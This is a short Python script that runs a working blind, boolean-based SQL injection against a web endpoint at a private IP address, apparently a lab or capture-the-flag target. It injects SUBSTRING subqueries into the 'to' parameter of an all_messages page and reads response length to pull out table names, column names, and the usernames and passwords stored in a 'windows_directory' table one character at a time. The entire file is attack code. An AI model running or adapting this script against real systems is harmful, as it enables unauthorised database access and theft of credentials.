import requests
            
print("running...")
columns = ["username",
            "password",
            #"message_from",
            #"message_subject",
            #"message_text"
            ]

chars = " abcdefghijklmnopqrstuvwxyz0123456789}{)(-_$£!@.,><][]"


for i in range(0, 200):
    tmp = "{}: ".format(i)

    for column in columns:
        msgRange = 10
        if column == "message_subject" or column == "message_text":
            msgRange = 20
        for j in range(0, 50):
            for char in chars:


                test = "SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1), {},1) = '{}'".format(i, j, char)
                test = "SUBSTRING((SELECT user FROM users LIMIT {},1), {},1) = '{}'".format(i, j, char)
                test = "SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='windows_directory' LIMIT {},1), {},1) = '{}'".format(i, j, char)

                test = "SUBSTRING((SELECT {} FROM windows_directory LIMIT {},1), {},1) = '{}'".format(column, i, j, char)

                query = "http://10.102.102.200/all_messages?to=' OR '1'='1' OR '"
                query = query.replace("'1'='1'", test)



                






                r = requests.get(query)

                #print(len(r.text))

                if len(r.text) > 3000:
                    #print("True")
                    tmp += char
                    #print(char)
                else:
                    pass
                    #print("False")
            #tmp += ", "
    print(tmp)
